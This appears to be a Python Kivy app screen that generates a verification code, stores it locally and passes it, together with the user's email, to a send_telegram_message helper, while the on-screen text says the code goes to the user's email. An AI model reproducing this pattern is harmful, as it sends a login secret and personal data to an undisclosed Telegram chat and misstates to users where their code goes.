from kivy.uix.screenmanager import Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.storage.jsonstore import JsonStore
from utils import generate_code, send_telegram_message

store = JsonStore("user_data.json")

class SendCodeScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()

    def build_ui(self):
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)

        self.message_label = Label(
            text="Your request has been submitted.\nPlease wait for the code to arrive to your email.",
            font_size=20,
            halign="center",
            valign="middle"
        )
        self.message_label.bind(size=self.message_label.setter('text_size'))

        self.next_btn = Button(text="Continue", size_hint_y=None, height=50)
        self.next_btn.bind(on_release=self.send_code_and_go)

        layout.add_widget(self.message_label)
        layout.add_widget(self.next_btn)

        self.add_widget(layout)

    def send_code_and_go(self, instance):
        code = generate_code()

        if store.exists("user"):
            data = store.get("user")
        else:
            data = {}

        data['code'] = code
        store.put("user", **data)

        send_telegram_message(f"🔐 Code sent to {data.get('email', 'unknown')}: {code}")

        self.manager.current = "verify"
